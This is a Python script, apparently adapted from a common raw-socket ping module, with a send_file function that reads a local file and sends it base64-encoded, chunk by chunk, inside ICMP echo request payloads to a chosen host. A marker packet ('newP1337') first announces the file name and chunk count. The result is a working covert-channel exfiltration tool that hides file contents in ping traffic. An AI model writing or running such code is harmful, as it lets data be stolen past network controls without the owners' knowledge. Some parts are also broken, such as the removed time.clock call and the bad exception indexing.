#!/usr/bin/env python 
 
import math 
import os 
import re 
import sys 
import socket 
import struct 
import select 
import time 
import threading 
import base64 
 
__version__ = '1.0.0' 
 
if sys.platform == "win32": 
    # On Windows, the best timer is time.clock() 
    default_timer = time.clock 
else: 
    # On most other platforms the best timer is time.time() 
    default_timer = time.time 
 
# From /usr/include/linux/icmp.h; your milage may vary. 
ICMP_ECHO_REQUEST = 8  # Seems to be the same on Solaris. 
 
 
def checksum(source_string): 
    """ 
    I'm not too confident that this is right but testing seems 
    to suggest that it gives the same answers as in_cksum in ping.c 
    """  
    sum = 0 
    countTo = len(source_string) 
    count = 0 
    while count < countTo: 
        thisVal = source_string[count + 1] * 256 + source_string[count] 
        sum = sum + thisVal 
        count = count + 2 
 
    if countTo < len(source_string): 
        sum = sum + ord(source_string[len(source_string) - 1]) 
 
    sum = (sum >> 16) + (sum & 0xffff) 
    sum = sum + (sum >> 16) 
    answer = ~sum 
    answer = answer & 0xffff 
 
    # Swap bytes. Bugger me if I know why. 
    answer = answer >> 8 | (answer << 8 & 0xff00) 
 
    return answer 
 
 
def receive_one_ping(my_socket, ID, timeout): 
    """ 
    receive the ping from the socket. 
    """ 
    timeLeft = timeout 
    while True: 
        startedSelect = default_timer() 
        whatReady = select.select([my_socket], [], [], timeLeft) 
        howLongInSelect = (default_timer() - startedSelect) 
        if whatReady[0] == []:  # Timeout 
            return 
 
        timeReceived = default_timer() 
        recPacket, addr = my_socket.recvfrom(1024) 
        icmpHeader = recPacket[20:28] 
        type, code, checksum, packetID, sequence = struct.unpack( 
            "bbHHh", icmpHeader 
        ) 
        # Filters out the echo request itself. 
        # This can be tested by pinging 127.0.0.1 
        # You'll see your own request 
        if type != 8 and packetID == ID: 
            bytesInDouble = struct.calcsize("d") 
            timeSent = struct.unpack("d", recPacket[28:28 + bytesInDouble])[0] 
            return timeReceived - timeSent 
 
        timeLeft = timeLeft - howLongInSelect 
        if timeLeft <= 0: 
            return 
 
 
def send_one_ping(my_socket, host, port, ID, data): 
    """ 
    Send one ping to the given >host<. 
    """ 
    host = socket.gethostbyname(host) 
    # Header is type (8), code (8), checksum (16), id (16), sequence (16) 
    my_checksum = 0 
 
    # Make a dummy heder with a 0 checksum. 
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
    bytesInDouble = struct.calcsize("d")
    data = base64.b64encode(data.encode('ascii')).decode("utf-8") 
    #data = (256 - bytesInDouble) * encoded 
    data = struct.pack("d", default_timer()) + data.encode() 
    # Calculate the checksum on the data and the dummy header. 
    my_checksum = checksum(header + data) 
 
    # Now that we have the right checksum, we put that in. It's just easier 
    # to make up a new header than to stuff it into the dummy. 
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1) 
    packet = header + data
    my_socket.sendto(packet, (host, 1))  # Don't know about the 1 
 
 
def ping(host, port, timeout, data): 
    """ 
    Send one ping to destination address with the given timeout. 
 
    Args: 
        host: Str. The destination address. Ex. "192.168.1.1"/"example.com" 
        timeout: Int. Timeout in seconds. Default is 4s, same as Windows CMD. 
 
    Returns: 
        The delay (in seconds) or None on timeout. 
    """ 
    icmp_protocol = socket.getprotobyname("icmp") 
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp_protocol) 
    my_ID = threading.current_thread().ident & 0xFFFF 
    send_one_ping(my_socket, host, port, my_ID, data) 
    delay = receive_one_ping(my_socket, my_ID, timeout) 
    my_socket.close() 
    return delay 
 
 
def verbose_ping(host, port, timeout, count, mtu, data): 
    """ 
    Send pings to destination address with the given timeout and display the result. 
 
    Args: 
        host: Str. The destination address. Ex. "192.168.1.1"/"example.com" 
        timeout: Int. Timeout in seconds. Default is 4s, same as Windows CMD. 
        count: Int. How many pings should be sent. Default is 4, same as Windows CMD. 
 
    Returns: 
        Formatted ping results printed. 
    """ 
    for i in range(count): 
        print("ping '{}' ... ".format(host), end='') 
        try: 
            data_offset = i * mtu 
            data_snip = data_offset + mtu 
            delay = ping(host, port, timeout, data[data_offset:data_snip])
        except socket.gaierror as e: 
            print("Failed. (socket error: '{}')".format(e[1])) 
            break 
 
        if delay is None: 
            print("Timeout > {}s".format(timeout)) 
        else: 
            delay = delay * 1000 
            print("{}ms".format(int(delay))) 
    print 
 
 
def read_file(file_name): 
  fp = open(file_name) 
  contents = fp.read() 
  return contents
 
def send_file(host,filename, mtu=128): 
    if mtu == None:
        mtu = 128
        
    port = int(1337)
    timeout = int(4) 
    data = read_file(filename)
    count = math.ceil(len(data) / mtu)
    first_packet = "newP1337;%s;%d" % (filename, count)

    ping(host, port, timeout, first_packet)
    verbose_ping(host, port, timeout, count, mtu, data)